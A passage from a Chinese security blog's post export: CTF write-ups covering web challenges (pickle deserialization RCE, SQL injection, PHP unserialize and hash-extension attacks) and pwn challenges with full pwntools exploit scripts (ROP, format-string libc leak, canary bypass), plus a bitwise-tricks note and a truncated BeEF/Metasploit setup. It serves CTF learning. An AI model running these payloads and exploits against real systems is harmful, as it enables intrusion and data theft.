然后将php.ini中的phar.readonly设为Off，运行得到1.phar，上传并抓包，更改文件名为1.gif，更改Content-Type为image/gif即可成功上传。最后删除，更改文件名为phar://1.gif，触发unlink读取flag。 [ASIS 2019]Unicorn shop本题需要花费1337购买超级独角兽，但输入的价格只能是一个字符。查看源代码发现提示和UTF8相关，因此去查询Unicode中数值大于1337的字符的UTF8编码，举个例子： 1id=4&amp;price=%e1%8d%bc 这个字符代表一万，因此可以购买。查询网站 [CISCN2019 华北赛区 Day1 Web2]ikun首先需要找到lv6，页数很多，写脚本跑一下： 12345678910import requestsbase = 'http://92a45198-65ac-407a-afbb-530a083474e9.node3.buuoj.cn/shop?page='for i in range(1,2000): url = base + str(i) r = requests.get(url) if 'lv6.png' in r.text: print(i) break 发现在181页，点击购买发现钱不够但是存在折扣，因此抓包修改折扣为非常小的数字，进入b1g_m4mber页面，提示说只有admin可以访问。 抓包发现存在一个长度看起来很短的jwt，扔到c_jwt_cracker里跑出密钥1Kun，从而可以到jwt.io上伪造admin身份。 随后多出了一键成为大会员的功能，但是点击没有用，查看源代码得到源码。经过代码审计后，发现在Admin.py处存在pickle反序列化： 12345678@tornado.web.authenticateddef post(self, *args, **kwargs): try: become = self.get_argument('become') p = pickle.loads(urllib.unquote(become)) return self.render('form.html', res=p, member=1) except: return self.render('form.html', res='This is Black Technology!', member=0) 我们可以借助其魔术方法__reduce__来执行python代码。参考 注意pickle不能跨python版本，这里采用python2： 123456789import pickleimport urllibclass payload(object): def __reduce__(self): return (eval, ('open(&quot;/flag.txt&quot;,&quot;r&quot;).read()',))p = pickle.dumps(payload())print urllib.quote(p) 即可生成URL编码的序列化数据，填入become字段即可。 1c__builtin__%0Aeval%0Ap0%0A%28S%27open%28%22/flag.txt%22%2C%22r%22%29.read%28%29%27%0Ap1%0Atp2%0ARp3%0A. [GYCTF2020] Blacklist存在过滤语句return preg_match(&quot;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\\./i&quot;,$inject);，无法select，可以考虑堆叠注入： 12-1';show tables;#-1';show columns from FlagHere;# 可以得到列名为flag，然后通过HANDLER语法读取flag。 1-1';handler FlagHere open; handler FlagHere read first; handler close;# [安洵杯 2019]easy_serialize_php12345678910111213141516171819202122232425262728293031323334353637383940&lt;?php$function = @$_GET['f'];function filter($img){ $filter_arr = array('php','flag','php5','php4','fl1g'); $filter = '/'.implode('|',$filter_arr).'/i'; return preg_replace($filter,'',$img);}if($_SESSION){ unset($_SESSION);}$_SESSION[&quot;user&quot;] = 'guest';$_SESSION['function'] = $function;extract($_POST);if(!$function){ echo '&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;';}if(!$_GET['img_path']){ $_SESSION['img'] = base64_encode('guest_img.png');}else{ $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));}$serialize_info = filter(serialize($_SESSION));if($function == 'highlight_file'){ highlight_file('index.php');}else if($function == 'phpinfo'){ eval('phpinfo();'); //maybe you can find something in here!}else if($function == 'show_image'){ $userinfo = unserialize($serialize_info); echo file_get_contents(base64_decode($userinfo['img']));} 本题的关键问题在于，对于序列化后的数据进行过滤，导致反序列化时出错。 首先存在明显的变量覆盖，显然可以覆盖的变量只有$_SESSION，随后注意到如果指定img_path那么$SESSION[img]将被哈希，变得不可控。而下方file_get_contents又提醒我们必须控制img字段，因此需要通过反序列化字符逃逸来实现。 先通过提示在phpinfo中发现d0g3_f1ag.php文件，这就是我们要放进img的文件了。随后利用filter函数的过滤功能吞掉24个字符，使得反序列化时多读入后24字符并舍弃后面的所有内容。具体地说，构造： 1_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;} 那么序列化后数据变为： 1a:3:{s:4:&quot;user&quot;;s:24:&quot;flagflagflagflagflagflag&quot;;s:8:&quot;function&quot;;s:59:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;}&quot;;s:3:&quot;img&quot;;s:28:&quot;L3VwbG9hZC9ndWVzdF9pbWcuanBn&quot;;} 再经过filter，变成： 1a:3:{s:4:&quot;user&quot;;s:24:&quot;&quot;;s:8:&quot;function&quot;;s:59:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;}&quot;;s:3:&quot;img&quot;;s:28:&quot;L3VwbG9hZC9ndWVzdF9pbWcuanBn&quot;;} 此时，user字段向后读24字符，其值为&quot;;s:8:&quot;function&quot;;s:59:&quot;a，随后是我们控制的img字段和dd字段（注意需满足长度为59），}后的内容被忽略。此时我们就成功控制了img，读到了d0g3_f1ag.php。文件内容指向另一个文件，同样方法读取即可。 [网鼎杯2018]Comment存在.git泄露，GitHack发现恢复的文件不全，然后通过git log --reflog发现了一个stashed的记录，用git reset --hard xxx回滚到该记录得到完整代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;?phpinclude &quot;mysql.php&quot;;session_start();if($_SESSION['login'] != 'yes'){ header(&quot;Location: ./login.php&quot;); die();}if(isset($_GET['do'])){switch ($_GET['do']){case 'write': $category = addslashes($_POST['category']); $title = addslashes($_POST['title']); $content = addslashes($_POST['content']); $sql = &quot;insert into board set category = '$category', title = '$title', content = '$content'&quot;; $result = mysql_query($sql); header(&quot;Location: ./index.php&quot;); break;case 'comment': $bo_id = addslashes($_POST['bo_id']); $sql = &quot;select category from board where id='$bo_id'&quot;; $result = mysql_query($sql); $num = mysql_num_rows($result); if($num&gt;0){ $category = mysql_fetch_array($result)['category']; $content = addslashes($_POST['content']); $sql = &quot;insert into comment set category = '$category', content = '$content', bo_id = '$bo_id'&quot;; $result = mysql_query($sql); } header(&quot;Location: ./comment.php?id=$bo_id&quot;); break;default: header(&quot;Location: ./index.php&quot;);}}else{ header(&quot;Location: ./index.php&quot;);}?&gt; 插入数据时进行转义，但获取category时没有转义直接拼接到了sql语句中执行，因此可以二次注入。 首先是发帖，设置category为', content=user(),/*，那么sql语句变成 1insert into board set category = '', content=user(),/*', title = '1', content = '2' 然后评论*/#，sql语句为： 1insert into comment set category = '', content=user(),/*', content = '*/#', bo_id = '1' 则评论内容中就会显示当前用户为root，随后查看/etc/passwd发现存在www用户，再查看/home/www/.bash_history发现存在.DS_Store文件。 随后查看.DS_Store文件： 1',content=(select hex(load_file('/tmp/html/.DS_Store'))),/* 解码得到flag文件名：flag_8946e1ff1ee3e40f.php。同样方法读取即可。","link":"/post/BUUWeb/"},{"title":"位运算用法整理","text":"实训准备的第二弹。 简介整理了一些和位运算相关的内容,主要分为以下几个部分: 集合的整数表示 位运算的常见技巧和常用公式 gcc 中__builtin系列函数及 C++中bitset类的简介 集合的整数表示//以下内容摘自挑战程序设计竞赛: 在程序中表示集合的方法有很多种,当元素数比较少时,像这样用二进制码来表示比较方便.集合${0,1,…,n-1}$的子集 S 可以用如下方式编码成整数.$$f(S)=\\sum\\limits_{i\\in{S}}2^i$$ 像这样表示之后,一些集合运算可以对应地写成如下方式. 空集:0 只含有第 i 个元素的集合:1&lt;&lt;i 含有全部 n 个元素的集合:(1&lt;&lt;n)-1 判断第 i 个元素是否属于集合 S:if (S&gt;&gt;i &amp; 1) 向集合中加入第 i 个元素:S | 1&lt;&lt;i 从集合中去除第 i 个元素:S &amp; ~(1&lt;&lt;i) 求 S 和 T 的交集,并集:S|T, S&amp;T 此外,想要将集合${0,1,…,n-1}$的所有子集枚举出来的话,可以像下面这样书写 1234for (int S = 0; S &lt; (1&lt;&lt;n); ++S){ //对子集的处理} 按这个顺序循环的话, S 便会从空集开始,然后按照{0},{1},{0,1},…{0,1,…,n-1}的升序顺序枚举出来. 更高级的内容参见挑战程序设计竞赛.其实是懒 位运算的常见技巧和常用公式如有遗漏请务必补充. (来自:树状数组lowbit)取出”从 x 的最低位的 1 直到最后”的值:x &amp;= -x (来自:线段树)快速求$2x,2x+1$:x&lt;&lt;1, x&lt;&lt;1|1 (来自:我也不知道来自哪里)把 x 最低位的 1 变成 0:x &amp;= (x-1) (来自:我也不知道来自哪里)把 x 最低位的 0 变成 1:x |= x+1 (来自:状压 dp)判断 x 的第 i 位是不是 1:if (x &amp; (1&lt;&lt;i)) (来自:博弈论)异或(Xor)运算的性质:同一个数异或两次即为其自身 (来自:csapp)C/C++中对于有符号数,&gt;&gt;表示算术右移；对于无符号数,&gt;&gt;表示逻辑右移.对于两者而言,&lt;&lt;都表示逻辑左移. (来自:为了偷懒不写 EOF)表示 x 不等于-1:~x.这也就是说,while(scanf(&quot;%d&quot;, &amp;n) != EOF)等价于while(~scanf(&quot;%d&quot;, &amp;n)). 由于其中原理都不难推导,这里不再赘述. gcc 中__builtin 系列函数及 C++中 bitset 类的简介这里只记录一些实训可能会用到的…… __builtin以下函数都返回int，x 都为unsigned int。（当然在函数名后加l或ll可以改为long/long long类型） __builtin_popcount(x)：x 中 1 的个数 __builtin_ctz(x)：x 末尾 0 的个数（x 非 0） __builtin_clz(x)：x 前导 0 的个数（x 非 0） __builtin_ffs(x)：x 中最后一个为 1 的位是从后向前的第几位 __builtin_parity(x)：x 中 1 的个数模 2 的值 bitset本来想自己写一下，后来发现这个博客和这个博客总结得很好，就偷了个懒。 一般来说实训当中不太会有很需要用到__builtin 和 bitset 的题目，所以了解一下就可以了。","link":"/post/BitwiseOps/"},{"title":"Bugku Pwn 练习","text":"Pwn 入门。 pwn1nc 上去直接拿到了 shell。 pwn2123456789101112int __cdecl main(int argc, const char **argv, const char **envp){ char s; // [rsp+0h] [rbp-30h] memset(&amp;s, 0, 0x30uLL); setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stdin, 0LL, 1, 0LL); puts(&quot;say something?&quot;); read(0, &amp;s, 0x100uLL); puts(&quot;oh,that's so boring!&quot;); return 0;} 最简单的栈溢出，IDA 中可以发现目标函数get_shell_，地址为0x400751。s位于ebp-0x30，与要覆盖的返回地址相差0x38（注意是 64 位程序），那 payload 就是'a'*0x38 + p64(0x400751)。 12345678910from pwn import *p = remote('114.116.54.89', 10003)payload = 'a'*0x38 +p64(0x400751)p.recvline()p.sendline(payload)p.interactive() pwn4和 pwn2 的区别是没有现成的get_shell函数了，checksec 发现什么保护也米有，估计是写shellcode。 123456789101112__int64 __fastcall main(__int64 a1, char **a2, char **a3){ char s; // [rsp+0h] [rbp-10h] memset(&amp;s, 0, 0x10uLL); setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stdin, 0LL, 1, 0LL); puts(&quot;Come on,try to pwn me&quot;); read(0, &amp;s, 0x30uLL); puts(&quot;So~sad,you are fail&quot;); return 0LL;} 但是填充需要0x18字节，能输入的只有0x30字节，没有足够长度写shellcode，因此这个办法行不通。 IDA 中浏览下函数，发现有个奇怪的函数： 1234int sub_400751(){ return system(&quot;ok~you find me,but you can't get my shell'&quot;);} 这里给了system函数，我们只需要让他的参数为/bin/sh就行了。我们搜索下字符串： 这里有一堆没有意义但显然是人为添加的字符串，可以猜想我们需要的东西肯定在里面。观察到其中一个字符串末尾是$0，这就是我们需要的 shell 的别名了。 先定位call _system的地址0x40075a，随后需要在 64 位下传参，也就是需要pop rdi; ret这样的gadget，最后要定位$0的位置： 12$ ROPgadget --binary pwn4 --only 'pop|ret'$ ROPgadget --binary pwn4 --string '\\$0' 得到pop rdi; ret的地址0x4007d3和$0的地址0x60111f。 123456789101112from pwn import *context(arch='amd64', os='linux')p = remote('114.116.54.89', 10004)payload = 'a'*0x18 + p64(0x4007d3) + p64(0x60111f) + p64(0x40075a)p.recvline()p.sendline(payload)p.interactive() pwn512345678910111213141516171819202122232425int __cdecl main(int argc, const char **argv, const char **envp){ char s; // [rsp+0h] [rbp-20h] setvbuf(_bss_start, 0LL, 2, 0LL); setvbuf(stdin, 0LL, 1, 0LL); memset(&amp;s, 0, 0x20uLL); puts(&amp;::s); read(0, &amp;s, 8uLL); printf(&amp;s, &amp;s); puts(&amp;s); puts(&amp;s); puts(&amp;s); puts(&amp;byte_400978); sleep(1u); puts(asc_400998); read(0, &amp;s, 0x40uLL); if ( !strstr(&amp;s, &amp;needle) || !strstr(&amp;s, &amp;byte_4009BA) ) { puts(&amp;byte_4009C8); exit(0); } puts(&amp;byte_4009F8); return 0;} 注意到printf(&amp;s, &amp;s);，说明这里有一个格式化字符串漏洞。通过 gdb 调试后发现，我们可以泄露__libc_start_main地址来得到system和/bin/sh的地址。 而__libc_start_main和我们的输入在栈上相差0x28，换算成偏移量就是0x28 / 8 = 0x05，此外还需要考虑 64 位下的六个传参寄存器，因此总偏移为0xb。我们输入%11$p即可泄露__libc_start_main地址0x7ffff7a2d830。 接下来就交给libc_database工具了： 12345678910$ ./find __libc_start_main_ret 830ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64)archive-glibc (id libc6_2.23-0ubuntu3_amd64)$ ./dump libc6_2.23-0ubuntu10_amd64offset___libc_start_main_ret = 0x20830offset_system = 0x0000000000045390offset_dup2 = 0x00000000000f7970offset_read = 0x00000000000f7250offset_write = 0x00000000000f72b0offset_str_bin_sh = 0x18cd57 随后我们用和 pwn4 相同的方法找到pop rdi; ret的gadget地址0x400933就可以用类似的办法构造 payload 了。需要注意的是，程序中还限制了第二次输入的字符串必须包含鸽子和真香两个子串。 最后的 payload： 1234567891011121314151617181920212223242526272829# coding:utf-8from pwn import *context(arch='amd64', os='linux', log_level='DEBUG')p = remote('114.116.54.89', 10005)#p=process('./human')p.recvline()p.recvline()p.sendline('%11$p')libc_leak = int(p.recvuntil('\\n')[2:-1], 16)offset___libc_start_main_ret = 0x20830offset_system = 0x0000000000045390offset_str_bin_sh = 0x18cd57base = libc_leak - offset___libc_start_main_retsystem_addr = base + offset_systembinsh_addr = base + offset_str_bin_shpop_rdi = 0x400933payload = '鸽子真香'.ljust(0x28, 'a')payload += p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)p.recvuntil('?\\n')p.sendline(payload)p.interactive() pwn3本题vuln函数关键代码： 1234567891011121314puts(&quot;write some note:&quot;);puts(&quot; please input the note len:&quot;);note_len = 0;__isoc99_scanf(&quot;%d&quot;, &amp;note_len);puts(&quot;please input the note:&quot;);read(0, thinking_note, (unsigned int)note_len);puts(&quot;the note is: &quot;);puts(thinking_note);if ( strlen(thinking_note) != 624 ){ puts(&quot;error: the note len must be 624&quot;); puts(&quot; so please input note(len is 624)&quot;); read(0, thinking_note, 0x270uLL);} 分析vul函数可知，read处可以栈溢出，且长度也是我们可控的。第二次read时限制了长度最大为0x270，而我们输入的thinking_note距离ebp是0x260也就是608字节。 本题开启了 canary 保护，因此首先需要泄露 canary，canary 位于ebp-0x8位置。泄露完后要返回到main，但是开启了 ASLR 导致我们无法确定main的位置。然而，ASLR 不会随机化低 12 位。我们观察 IDA 发现vul函数返回到0xd2e而main位于0xd20，因此只需要覆盖2e为20即可，不受 ASLR 影响。 123456789101112131415def ret2main(): payload = flat('a'*600,canary,'a'*8,'\\x20') p.sendafter('624)\\n', payload)def send(payload): p.sendlineafter('path:\\n','flag') p.sendlineafter('len:\\n','999') p.sendlineafter('note:\\n',payload) p.recvuntil('aaaa\\n')# leak canarysend('a'*600)canary = u64('\\x00' + p.recv(7))log.success('canary:' + hex(canary))ret2main() 注意这里覆盖的是 canary 的低位字节，恢复时需要注意默认的小端法表示。 接下来，我们要泄露程序基址以绕过 ASLR。这里可以泄露vul函数返回地址，减去其偏移量0xd2e来得到。 12345# leak elf basesend('a'*615)base = u64(p.recv(6).ljust(8,'\\x00')) - 0xd2elog.success('base: ' + hex(base))ret2main() 发送'a'*615加上最后的回车实际上是 616 字节，恰好覆盖了 canary 和 saved ebp，接下来打印的就是返回地址。这一步做完后用同样的办法返回main。 第三次，我们已经绕过 canary 和 ASLR，需要泄露libc地址，由于这里有puts函数，直接按照常规的ret2libc方法即可。这里采用了泄露read函数 GOT 地址的方法。 1234567891011121314151617181920def ret2libc(leak, func): libc = LibcSearcher(func, leak) base = leak - libc.dump(func) system = base + libc.dump('system') binsh = base + libc.dump('str_bin_sh') return (system, binsh)# leak libcpop_rdi = 0xe03main = 0xd20payload = flat(['a'*600,canary,'a'*8,base+pop_rdi,base+elf.got['read'],base+elf.plt['puts'],base+main])send(payload)payload = flat('a'*600,canary,'a'*8,base+pop_rdi)p.recvuntil('624)\\n')p.send(payload)read = u64(p.recv(6).ljust(8,'\\x00'))log.success('read: ' + hex(read))system, binsh = ret2libc(read, 'read') 尤其需要注意，第二次输入长度不能超过0x270也就是624，这里构造的 payload 恰好长度为 624，因此只能用p.send()不能p.sendline()，否则会多出一个0a字节使程序终止。 最后就可以 getshell 了： 123456# get shellpayload = flat('a'*600,canary,'a'*8,base+pop_rdi,binsh,system)send(payload)p.sendlineafter('624)\\n','a')p.interactive()","link":"/post/BugkuPwn/"},{"title":"CISCN2019 初赛+半决赛 部分题解","text":"打完比赛就回去必修课期末考，于是现在才整理。这里只记录了少数几题的 writeup。 初赛签到下载压缩包后解压得到 exe，运行后发现需要通过摄像头识别 3 个队员的人脸。识别成功后即得到 flag。 Saleae下载文件后解压得到 saleae.logicdata，因此我们用 Logic 打开该文件，得到四信道的波形图： 由于题目提示该波形图来自 U 盘，而且共有四个信道，因此猜想可能采用了 SPI 协议。在右侧 Analyzer 里新建分析器： 这里主要需要确定的是四个信道是如何对应 SPI 协议的四信道的。观察波形： 可以看到 Channel0 波形周期十分稳定，比较可能是 Clock；Channel1 持续低电平，可能是 Enable，或者 MOSI/MISO 二者之一。 Channel2 波形较不规律，则必定是 MOSI/MISO 二者之一；Channel3 对应 Channel2 的那一段，两端恰好发生跳变，因此很有可能是 Enable。于是我们推出 Channel1 只能是 MOSI/MISO 二者之一。 最终，我们发现这样的信道分配可以给出有用的信息： 拼接成字符串即可得到 flag。0x0224c 操作内容： 24c同上题做法，根据波形猜测为I2C协议，载入模板可得： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253Time[s],AnalyzerName,DecodedProtocolResult0.843705500000000,I2C,SetupWriteto['160']+ACK0.843872000000000,I2C,''+ACK0.844038500000000,I2C,f+ACK0.844205000000000,I2C,1+ACK0.844371000000000,I2C,6+ACK0.844537500000000,I2C,3+ACK0.844704000000000,I2C,b+ACK0.844870500000000,I2C,d+ACK0.845036500000000,I2C,f+ACK0.845203000000000,I2C,4+ACK0.845369500000000,I2C,e+ACK0.845536000000000,I2C,}+ACK0.845702500000000,I2C,'0'+ACK0.945796000000000,I2C,SetupWriteto['160']+ACK0.945962500000000,I2C,'0'+ACK0.946154000000000,I2C,SetupReadto['161']+ACK0.946318000000000,I2C,f+ACK0.946481500000000,I2C,l+ACK0.946645000000000,I2C,a+ACK0.946808500000000,I2C,g+ACK0.946972000000000,I2C,{+ACK0.947135500000000,I2C,c+ACK0.947299500000000,I2C,4+ACK0.947463000000000,I2C,6+ACK0.947626500000000,I2C,d+ACK0.947790000000000,I2C,9+ACK0.947953500000000,I2C,e+ACK0.948117500000000,I2C,1+ACK0.948281000000000,I2C,0+ACK0.948444500000000,I2C,-+ACK0.948608000000000,I2C,e+ACK0.948771500000000,I2C,9+ACK0.948935500000000,I2C,b+ACK0.949099000000000,I2C,5+ACK0.949262500000000,I2C,-+ACK0.949426000000000,I2C,4+ACK0.949589500000000,I2C,d+ACK0.949753000000000,I2C,9+ACK0.949917000000000,I2C,0+ACK0.950080500000000,I2C,-+ACK0.950244000000000,I2C,a+ACK0.950407500000000,I2C,8+ACK0.950571000000000,I2C,8+ACK0.950734500000000,I2C,3+ACK0.950898000000000,I2C,-+ACK0.951061500000000,I2C,4+ACK0.951225000000000,I2C,1+ACK0.951388500000000,I2C,c+NAK5.946480500000000,I2C,SetupWriteto['160']+ACK5.946647000000000,I2C,\\t+ACK5.946813500000000,I2C,a+ACK5.946980000000000,I2C,c+ACK 猜测 flag 为flag{c46d9e10-e9b5-4d90-a883-41cf163bdf4e}，但提交提示错误。 注意到最后三个字符\\t a c，由于\\t出现在这里很违和，猜想这个字符并不代表字符本身，而是 ASCII 码对应的十六进制数（也就是09）。结合I2C协议约定，猜测是将 flag 从第 9 位开始，用ac两个字符去覆盖掉原内容，于是得到：flag{c46dac10-e9b5-4d90-a883-41cf163bdf4e}，即最终 flag。 usbasp下载文件后解压得到 usbasp.logicdata，因此我们用 Logic 打开该文件，得到四信道的波形图。由于共有四个信道，因此猜想可能采用了 SPI 协议。在右侧 Analyzer 里新建分析器： 这里主要需要确定的是四个信道是如何对应 SPI 协议的四信道的。观察波形： 可以看到 Channel2 波形周期十分稳定，比较可能是 Clock；Channel0 和 Channel1 没有特定的规律，因此应该分别是 MISO/MOSI 之一。于是 Channel3 应该是 Enable。 此外，观察 Channel3，可以发现应该是高电平触发。最终，我们发现这样的信道分配和设置可以给出有用的信息： 拼接成字符串即可得到 flag。 居然能出三道差不多的题，而且号称是 IoT 题？？ Asymmetric（图片来自队友） 其实就是变种 RSA，明白了这一点就容易了，但是坑点在于 python 中long和bytes互转的问题，推荐 python2 写： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849import gmpy2import randomfrom Crypto.Util.number import *p=165740755190793304655854506052794072378181046252118367693457385632818329041540419488625472007710062128632942664366383551452498541560538744582922713808611320176770401587674618121885719953831122487280978418110380597358747915420928053860076414097300832349400288770613227105348835005596365488460445438176193451867p3 = p**3p4 = p**4def gcd(a,b): while a != 0: a,b = b%a, a return bdef generate_key(nbit): e=58134567416061346246424950552806959952164141873988197038339318172373514096258823300468791726051378264715940131129676561677588167620420173326653609778206847514019727947838555201787320799426605222230914672691109516799571428125187628867529996213312357571123877040878478311539048041218856094075106182505973331343540958942283689866478426396304208219428741602335233702611371265705949787097256178588070830596507292566654989658768800621743910199053418976671932555647943277486556407963532026611905155927444039372549162858720397597240249353233285982136361681173207583516599418613398071006829129512801831381836656333723750840780538831405624097443916290334296178873601780814920445215584052641885068719189673672829046322594471259980936592601952663772403134088200800288081609498310963150240614179242069838645027877593821748402909503021034768609296854733774416318828225610461884703369969948788082261611019699410587591866516317251057371710851269512597271573573054094547368524415495010346641070440768673619729280827372954003276250541274122907588219152496998450489865181536173702554116251973661212376735405818115479880334020160352217975358655472929210184877839964775337545502851880977049299029101466287659419446724781305689536816523774995178046989696610897508786776845460908137698543091418571263630383061605011820139755322231913029643701770497299157169690586232187419462594477116374977216427311975598620616618808494138669546120288334682865354702356192972496556372279363023366842805886601834278434406709218165445335977049796015123909789363819484954615665668979L pubkey = (long(e), long(p4)) return pubkeydef findModReverse(a,m): if gcd(a,m) != 1: return None u1, u2, u3 = 1L, 0L, a v1, v2, v3 = 0L, 1L, m while v3 != 0: q = u3//v3 v1, v2, v3, u1, u2, u3 = (u1-q*v1), (u2-q*v2), (u3-q*v3), v1, v2, v3 return u1%mdef crypt(msg, pkey): e, n = pkey m = bytes_to_long(msg) assert m &lt; n -1 enc = pow(m, e, n) return long_to_bytes(enc)def decrypt(msg, pkey): e, n = pkey c = bytes_to_long(msg) d = findModReverse(e, p3*(p-1)) dec = pow(c, d, n) return long_to_bytes(dec)nbit = 1024pubkey = generate_key(nbit)print 'pubkey =', pubkeycipher=&quot;YXmuOsaD1W4poLAG2wPrJ/nYZCkeOh2igCYKnZA6ecCeJadT6B3ZVTciPN6LJ8AcAsRXNnkC6+9PNJPhmosSG5UGGbpIcg2JaZ1iA8Sm3fGiFacGvQsJOqqIWb01rjaQ3rDBKB331rrNo9QNOfMnjKr0ejGG+dNObTtvnskICbYbNnSxMxLQF57H5JnWZ3LbbKQ493vmZzwvC6iH8blNPAp3dBlVzDqIAmxmUbk0OzFjPoHphD1oxHdzXyQNW+sLxVldrf9xcItq92jN5sqBYrG8wADIqY1/sqhTMZvkIYFMHqoMQuiRSnVrCF2h2RtGDEayLo0evgXI/0W3YveyKCHViOnG6wypcBFm91ZWdjp3fVW/4DyxW6xu9hg/NlXyRP6pT/OyQpcyTqKRuiXJLWgFUJI/8TRgyAjBLLgSd3U0N3VM8kewXw5j+fMUTCW9/Gy4iP8m52Zabx/vEKdwdGZ0QyvgvAWGUFZ96EK0g1BM/LU9Tuu2R+VKcCSCprg283x6NfYxmU26KlQE6ZrrjLmbCOe0327uaW9aDbLxZytPYIE5ZkzhSsD9JpQBKL30dCy3UKDbcuNgB6SrDddrbIuUd0/kLxuwh6kTqNbC4NDrOT4WAuP4se8GGOK8Wz0dL6rE6FkzMnI4Qg501MTSNQZ4Bp7cNf6H9lTa/4DNOl0==&quot;flag = decrypt(cipher.decode('base64'),pubkey)print flag JustSoso查看源代码发现需要hint.php，通过 php 伪协议转换为 Base64 编码获取：?file=php://filter/convert.base64-encode/resource=hint.php。 对于index.php也同理：?file=php://filter/convert.base64-encode/resource=index.php。 得到 index.php： 以及 hint.php： 从hint.php可以看出，Flag 类的getFlag函数最终会打印 flag，而该函数由Handle类调用。再审查index.php，发现需要先 include 一下hint.php，过滤后反序列化 payload。 因此我们需要利用 php 反序列化漏洞，先构造flag.php，即：newHandle(newFlag(“flag.php”))。 然后我们需要绕过的过滤有： payload 中对flag的正则过滤； 绕过__wakeup函数中对handle置null的操作； 绕过代码中要求 md5 值相等的判断。 由cve-2016-7124，我们知道，当序列化字符串中表示对象个数的值大于真实的属性个数时会跳过__wakeup()的执行。 因此我们在 payload 中需要注意：将 payload 中的 1 改为大于 1 的任意整数来跳过__wakeup函数，用%00填充Handle，并令token等于token_flag的引用。最终 payload: 1///index.php?file=hint.php&amp;payload=O:6:&quot;Handle&quot;:2:{s:14:&quot;%00Handle%00handle&quot;;O:4:&quot;Flag&quot;:3:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;s:5:&quot;token&quot;;N;s:10:&quot;token_flag&quot;;R:4;}} 浏览器中访问即可得到 flag。 半决赛web6本题存在.git仓库泄露，我们用GitHack提取文件： 1$ python GitHack.py http://172.29.12.114/.git/ 得到getflag.php和index.html，显然只有前者有用。查看getflag.php源码： 12345678910111213141516171819202122&lt;?phperror_reporting(0);include &quot;flag.php&quot;;$user=$_POST['user'];function encrypt($text){ global $key; return md5($key.$text);}if (encrypt($user)===$_COOKIE['verify']) { if(is_numeric(strpos($user,'root'))){ die($flag); } else{ die('not root！！！'); }}else{ setcookie(&quot;verify&quot;,encrypt(&quot;guest&quot;),time()+60*60*24); setcookie(&quot;len&quot;,strlen($key),time()+60*60*24);}//show_source(__FILE__); 我们想要进入die($flag)这一行，需要通过两个if判断，首先是要encrypt过后的user参数强等于Cookie中verify的值，后者是我们已知的（通过抓包获取，还可以知道len是 32）。接着要求user参数中包含root这个字符串。 通过下方setcookie(&quot;verify&quot;,encrypt(&quot;guest&quot;),time()+60*60*24);这一行我们知道，verify的值是guest经过encrypt后得到的，而encrypt中的全局变量key是我们无法得知的，因此无法强行计算encrypt这个函数的结果。换而言之，一个 32 位的key连接上user的md5值已知，而我们想构造出在key连接user再连接root后的新md5值，很容易想到哈希扩展攻击，构造 payload： 1./hash_extender --data admin123 --secret 10 --append admin123 --signature e7187cb49ce6d5958d279284af968254 --format md5 得到： 最后，用 URL 解码后的New string作为user参数的值，用New signature替换verify的值，即可得到flag： web3首先访问robots.txt得到： 123456789User-agent: BaiduspiderDisallow: /bdhfyusdfDisallow: /index?Disallow: /flaggalf?Disallow: /Are you OK?Disallow: /NEWbi?Disallow: /ndsufbewhjubdvse/niubi/ii4375uhnfsv/admin.php?Disallow: /googleDisallow: /PrivatePhotos 其中能访问的只有http://172.29.12.111/ndsufbewhjubdvse/niubi/ii4375uhnfsv/admin.php。访问后看到一个登陆页面，burp 抓包发现Cookie中存在一个特殊的字段： 1hash_key=e7187cb49ce6d5958d279284af968254; source=0 观察发现是 32 位，猜想是md5值。但是到这里为止很难再进一步分析。于是我们扫描当前目录，发现了License.txt： 123456789101112131415161718192021222324$flag = &quot;flag{xxxxxx_just_a_sample_xxxxxxx}&quot;;$bisskey = &quot;xxxxxxxxx_just_a_sample_xxxxxxx&quot;; // To remember Easily, 10 chars allowed.$username = $_POST[&quot;username&quot;];$password = $_POST[&quot;password&quot;];header(&quot;hash_key:&quot; . $hash_key);if (!empty($_COOKIE[&quot;MyIdentity&quot;])) { if (urldecode($username) === &quot;admin123&quot; &amp;&amp; urldecode($password) != &quot;admin123&quot;) { if ($_COOKIE[&quot;MyIdentity&quot;] === md5($bisskey . urldecode($username .$password))) { echo &quot;Great! You win!\\n&quot;; echo (&quot;&lt;!-- Y0ur f!4g 1s here &quot;. $flag . &quot;--&gt;&quot;); } else { die (&quot;I don't konw what you say!&quot;); } } else { die (&quot;I don't konw what you say!&quot;); }}setcookie(&quot;hash_key&quot;, md5($bisskey . urldecode(&quot;admin123&quot; . &quot;admin123&quot;)), time() + (60 * 60 * 24 * 7)); 这里接收username和passwd参数，并要求MyIdentity非空的情况下username强等于admin123且passwd经过 URL 解码不等于admin123。最后一层if是要求MyIdentity的值等于未知的长度为 10 的bisskey连接上username和passwd的md5值，显然这个我们也很难计算，但是类似web6，我们可以用哈希扩展攻击的方法得到 flag： 剩余的一些做出来的题，感觉记录的意义不大就没有记录下来。","link":"/post/CISCN2019/"},{"title":"Beef 加载 Metasploit 插件 &amp; Metasploit 连接 PostgreSQL","text":"没有什么坑点。 Beef 加载 Metasploit 插件修改 beef 的配置文件/usr/share/beef-xss/config.yaml，找到extension下的metasploit字段，修改为true。此外，建议修改credentials下的密码字段。 随后修改/usr/share/beef-xss/extensions/metasploit/config.yaml，找到beef-&gt;extension-&gt;metasploit下的host和callback_host字段，都改为虚拟机的内网 IP。最后，在倒数第二行找到： 1{os: 'custom', path: ''} 改为： 1{os: 'custom', path: 